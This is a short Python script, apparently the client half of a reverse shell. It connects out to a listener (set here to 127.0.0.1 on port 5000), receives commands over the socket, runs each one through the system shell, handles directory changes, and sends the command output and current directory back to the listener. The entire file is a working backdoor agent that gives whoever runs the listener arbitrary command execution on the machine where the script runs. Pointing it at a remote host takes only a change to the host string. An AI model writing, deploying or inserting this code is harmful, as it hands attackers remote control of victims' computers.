import socket
import os
import subprocess

s = socket.socket()
host = "127.0.0.1"
port = 5000

s.connect((host,port))

while True:
    data = s.recv(1024)

    if data[:2].decode('utf-8') == 'cd':
        os.chdir(data[3:].decode('utf-8'))

    if len(data) > 0 :
        cmd = subprocess.Popen(data[:].decode('utf-8'), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        output = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output,'utf-8')
        current_dir = os.getcwd() + '>'
        s.send(str.encode(output_str + current_dir))
        print(output_str)
